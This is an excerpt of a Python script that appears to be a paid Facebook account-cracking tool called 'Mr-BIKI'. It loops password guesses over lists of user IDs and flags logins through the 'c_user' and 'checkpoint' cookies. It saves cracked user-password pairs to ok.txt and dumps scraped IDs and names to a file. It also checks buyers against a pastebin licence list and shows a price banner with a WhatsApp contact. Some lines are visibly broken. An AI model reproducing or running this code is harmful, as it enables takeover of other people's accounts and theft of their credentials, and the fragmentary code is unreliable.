...
def main():
    ...
    if psy in ('0', '00'):
        exit('THANKS FOR USING Mr-BIKI TOOL')  
    else:
...
def sex():
  ...
  try: 
    httpCaht = requests.get("https://pastebin.com/raw/0dszVRHZ").text 
    if id in httpCaht: 
      ...
      os.system('xdg-open https://wa.me/+919957975493?text=*Hello*%2C%20*MR.BIKI*%20*i*%20*want*%20*to*%20*buy*%20*your*%20*command*%20*Random*%20*clone*')
      time.sleep(3) 
      sys.exit() 
  except: 
    sys.exit() 
...
class __crack__:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36mBIKI\033[1;37m] {loop}/{len(self.id)} \033[1;37m[\033[1;36mTOTAL-Id\033[1;37m] \033[1;37m[\033[1;36m{len(ok)}\033[1;37m]")
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;37m[\033[1;32mBIKI-OK\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('ok.txt','a').write('%s\n' % wrt)
				break
			elif 'checkpoint' in ses.cookies.get_dict():
				print('\r\033[1;31m[\033[1;30mBIKI-CP\033[1;31m]\033[1;30m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
...
class __filecrack3__:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36mBIKI\033[1;37m] {loop}/{len(self.id)} \033[1;37m[\033[1;32mOK-{len(ok)}\033[1;37m] ")
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if 'c_user' in ses.cookies.get_dict():
				...
				try:
					...
					month = bulan_ttl[month].print('\r\033[1;91m[BIKI-CP] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					...
					pass
				print('\r\033[1;91m[BIKI-CP] %s | %s%s      ' % (user,pw,tahun(user)))
...
class __cracking__:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36mBIKI\033[1;37m] {loop}/{len(self.id)} \033[1;37m[\033[1;36mTOTAL-Idz\033[1;37m] \033[1;37m[\033[1;36m{len(ok)}\033[1;37m]")
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
        ...
        try:
            ...
            for inayat in rgq['data']:
                ...
                try:
                    ...
                    last_name = 'Khan'
                idsave.write(uids+'|'+first_name+' '+last_name+'\n')
            print('\033[1;97m [\033[1;32mBIKI\033[1;37m] \033[1;36mSUCCESSFULL DUMP FROM\033[1;37m '+ids)
            idsave.close()
...
\033[1;95m 
               (>Welcome Mr-BIKI>)                 
\033[1;32m┌────────────────────────────────────────────────┐
\033[1;95m│\033[1;31m➣\033[1;37m AUTHOR  \033[1;31m:\033[1;32m Mr.BIKI│\033[1;37m• \033[1;36mTHIS TOOL IS PAID\033[1;37m•\033[1;32m        │
\033[1;95m│\033[1;31m➣\033[1;37m FACEBOOK\033[1;31m:\033[1;32m Mr.BIKI│\033[1;37m• \033[1;36mONLY BD PACKAGE   \033[1;37m• \033[1;32m      │
\033[1;95m│\033[1;31m➣\033[1;37m WHATSAPP\033[1;31m:\033[1;32m +919957975493│\033[1;32m──────────────────────\033[1;32m│
\033[1;95m│\033[1;31m➣\033[1;37m GITHUB  \033[1;31m:\033[1;32m biki404-cyber \033[1;37m  • \033[1;36mPRICE \033[1;31m=\033[1;36m(1week200)\033[1;37m•\033[1;32m│
\033[1;95m└────────────────────────────────────────────────┘
\033[1;96m│         \033[1;37m•  THIS TOOLS CREATED BY Mr.BIKI \033[1;37m•     \033[1;32m│
\033[1;32m└────────────────────────────────────────────────┘
"""
ct = datetime.now()
n = ct.month
